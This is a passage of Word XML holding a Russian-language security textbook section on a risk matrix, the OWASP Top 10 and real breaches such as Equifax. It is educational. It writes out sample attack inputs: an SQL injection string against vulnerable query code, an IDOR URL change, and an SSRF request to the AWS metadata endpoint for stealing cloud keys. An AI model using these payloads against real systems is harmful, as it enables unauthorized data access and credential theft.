        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------------|------------------|-------------------|-------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Высокая вероятность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Средний риск | Высокий риск | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Критический риск</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Средняя вероятность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Низкий риск | Средний риск | Высокий риск |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Низкая вероятность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Низкий риск | Низкий риск | Средний риск |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SQL-инъекция на форме логина** (высокая вероятность, высокий ущерб) → **критический риск** → защищаемся в первую очередь (параметризованные запросы, WAF).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**APT атака на блог о котиках** (низкая вероятность, низкий ущерб) → **низкий риск** → можно не париться.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.3.5. TOP-10 OWASP: Самые частые уязвимости веб-приложений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OWASP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Open Web Application Security Project) — некоммерческая организация, которая публикует список </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TOP-10</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> самых опасных уязвимостей веб-приложений. Обновляется раз в несколько лет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Последняя версия</w:t>
      </w:r>
      <w:r>
        <w:t>: OWASP Top 10 (2021).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Давай пройдёмся по списку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Broken Access Control (Неправильное управление доступом)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Пользователь может получить доступ к данным/функциям, которые ему не положены.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Изменил URL `https://site.com/profile?id=123` → `id=124` → увидел профиль чужого пользователя.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>API не проверяет, имеет ли пользователь право удалять записи → любой может удалить любую запись.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверять права доступа **на сервере** (не на клиенте!).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовать **авторизацию** (проверка, что пользователь имеет право на действие).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Cryptographic Failures (Ошибки шифрования)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Неправильное использование шифрования или его отсутствие.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пароли хранятся в открытом виде (plaintext) или с MD5 (сломан).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сайт не использует HTTPS → пароли передаются открытым текстом.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется слабое шифрование (DES вместо AES).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HTTPS** (TLS 1.2 или 1.3).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хранить пароли с **bcrypt/Argon2** (хэш + соль).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Шифровать чувствительные данные в БД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Injection (Инъекция)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Злоумышленник вставляет вредоносный код в запрос.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Виды</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SQL-инъекция**: изменение SQL-запроса.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**NoSQL-инъекция**: для MongoDB и др.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**LDAP-инъекция**: для LDAP-запросов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**OS Command Injection**: выполнение команд ОС.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример SQL-инъекции</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Уязвимый код:</w:t>
        <w:br/>
        <w:t>username = request.GET['username']</w:t>
        <w:br/>
        <w:t>query = f"SELECT * FROM users WHERE username = '{username}'"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Хакер вводит: `admin' OR '1'='1`  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Результат: `SELECT * FROM users WHERE username = 'admin' OR '1'='1'`  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>→ Условие всегда истинно → хакер видит всех пользователей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Параметризованные запросы** (prepared statements).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ORM** (Объектно-реляционное отображение): Django ORM, SQLAlchemy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Валидация ввода**: проверять, что `username` содержит только буквы/цифры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Insecure Design (Небезопасный дизайн)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Ошибки в архитектуре системы (не реализация, а </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>дизайн</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Система восстановления пароля по "секретным вопросам" ("Девичья фамилия матери"). Хакер гуглит информацию о жертве → восстанавливает пароль.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Threat modeling** на этапе проектирования.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Secure by design**: изначально встраивать безопасность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Security Misconfiguration (Неправильная конфигурация)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Ошибки в настройке системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дефолтный пароль **admin/admin**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Открыт SSH (порт 22) на весь интернет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оставлена консоль отладки (Django Debug Mode в production).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не отключены ненужные сервисы (Telnet, FTP).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2017 году AWS S3-бакеты оставляли </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>публичными</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> по умолчанию → утечки данных (Verizon, Accenture, Dow Jones).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минимизация**: отключить всё, что не используется.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Hardening**: следовать гайдам по безопасной настройке (CIS Benchmarks).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Автоматизация**: Infrastructure as Code (Terraform, Ansible) → настройки в коде → меньше ошибок.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6. Vulnerable and Outdated Components (Устаревшие компоненты)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Использование библиотек/фреймворков с известными уязвимостями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Equifax (2017)**: Apache Struts с уязвимостью **CVE-2017-5638**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Log4Shell (2021)**: уязвимость в Log4j (Java-библиотека для логирования) → удалённое выполнение кода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Регулярные обновления**: `apt update &amp;&amp; apt upgrade`, `npm audit fix`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Vulnerability scanners**: Dependabot (GitHub), Snyk, OWASP Dependency-Check.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минимизация зависимостей**: используй только нужные библиотеки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7. Identification and Authentication Failures (Ошибки аутентификации)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Слабая или сломанная аутентификация.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Слабые пароли (`123456`, `password`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет ограничения попыток входа → brute force.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сессионный токен передаётся в URL (`site.com/?session=abc123`) → можно украсть из истории браузера.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет 2FA.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сильные пароли**: минимум 12 символов, сложность.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2FA/MFA**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Rate limiting**: блокировка после N неудачных попыток (Fail2Ban).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хранение токенов в cookies** (HttpOnly, Secure, SameSite).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>8. Software and Data Integrity Failures (Нарушение целостности ПО и данных)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Использование непроверенного ПО, отсутствие проверки целостности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Загрузка библиотек с CDN без проверки хэша → CDN взломали → пользователям подсунули вредоносный JS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CI/CD без проверки (злоумышленник изменил код в репозитории → код автоматически задеплоился на production).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Subresource Integrity (SRI)**: `&lt;script src="..." integrity="sha384-..."&gt;&lt;/script&gt;`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Подпись кода**: проверять цифровую подпись.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Проверка целостности**: хэши (SHA-256) при скачивании.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>9. Security Logging and Monitoring Failures (Отсутствие логирования и мониторинга)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Система не логирует события → невозможно обнаружить атаку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не логируются попытки входа → хакеры перебирают пароли, никто не замечает.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Логи не анализируются → атака произошла 3 месяца назад, узнали только сейчас.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Логирование**: успешные/неудачные попытки входа, изменения данных, доступ к критичным файлам.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SIEM**: Elasticsearch + Logstash + Kibana (ELK), Splunk.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Алерты**: автоматические уведомления при подозрительной активности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>10. Server-Side Request Forgery (SSRF)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Хакер заставляет сервер отправить запрос куда-то (например, к внутренним ресурсам).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Сайт позволяет загрузить изображение по URL:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>site.com/download?url=https://example.com/image.jpg</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Хакер вводит:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>site.com/download?url=http://169.254.169.254/latest/meta-data/</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AWS метадата-сервис</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (доступен только изнутри). Сервер выполнит запрос → хакер получит AWS-ключи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Whitelist**: разрешить только определённые домены.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Запретить** доступ к приватным IP (192.168.x.x, 127.0.0.1, 169.254.169.254).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.3.6. Реальные примеры угроз и взломов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Теория — это круто, но давай посмотрим на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>реальные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> инциденты. Это покажет, что угрозы — не абстрактная хрень, а вполне конкретные пиздецы, которые случаются каждый день.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Equifax (2017) — Утечка 147 миллионов записей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что произошло</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры использовали уязвимость в **Apache Struts** (веб-фреймворк).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уязвимость **CVE-2017-5638** была **известна** и **закрыта патчем** за 2 месяца до атаки.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Администраторы Equifax **не обновили** систему.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры **3 месяца** сидели в системе, собирали данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что украли</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ФИО, даты рождения, адреса, номера соцстрахования (SSN)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
